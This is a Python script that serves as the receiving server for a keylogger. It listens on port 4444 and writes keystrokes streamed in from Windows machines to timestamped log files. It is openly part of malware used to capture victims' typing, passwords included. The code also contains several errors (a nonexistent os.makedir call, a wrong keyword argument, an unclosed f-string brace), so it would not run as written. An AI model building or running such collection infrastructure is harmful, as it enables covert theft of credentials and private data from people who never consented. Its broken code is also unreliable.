import socket
import threading
import datetime
import os

HOST = '0.0.0.0'
PORT = 4444

log_dir = "received_keylogs"
os.makedir(log_dir, exists_ok=True)
timestammp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
log_file = f"{log_dir}/keylog_windows_{timestammp}.log"

def handle_client(conn, addr):
    print(f"[+] Connected from {addr}")
    with open(log_file, "a", encoding='utf-8') as f:
        f.write(f"=== Session from {addr} started at {datetime.datetime.now() ===\n")
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                msg = data.decode('utf-8', errors='ignore').strip()
                f.write(f"{datetime.datetime.now().strftime('%H:%M:%S')} | {msg}\n")
                f.flush()
            except:
                break
    print(f"[-] Disconnected {addr}")
    conn.close()

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(5)
        print(f"[*] Listening on {HOST}:{PORT}")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    start_server()
